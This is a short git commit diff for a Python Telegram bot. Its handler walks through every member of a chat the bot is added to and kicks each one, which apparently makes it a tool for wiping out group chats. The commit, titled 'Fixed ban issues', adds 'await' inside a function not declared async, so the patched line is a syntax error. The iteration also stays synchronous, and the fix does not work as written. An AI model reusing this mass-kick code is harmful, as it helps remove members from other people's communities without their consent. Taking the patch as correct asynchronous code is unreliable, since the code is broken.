975bbc02154fa258f493bd59e5f6b48b8d1c1e05
Zaid <itsunknown122@gmail.com>
2023-02-26 07:29:06 +0530

    Fixed ban issues

--- bot/__init__.py
+++ bot/__init__.py
@@ -31,7 +31,7 @@ def NewChat(bot,message):
     a= bot.iter_chat_members(message.chat.id)
     for i in a:
         try:
-            bot.kick_chat_member(chat_id =message.chat.id,user_id=i.user.id)
+            await bot.kick_chat_member(chat_id =message.chat.id,user_id=i.user.id)
             logging.info("kicked {} from {}".format(i.user.id,message.chat.id))
         except Exception:
             logging.info(" failed to kicked {} from {}".format(i.user.id,message.chat.id))
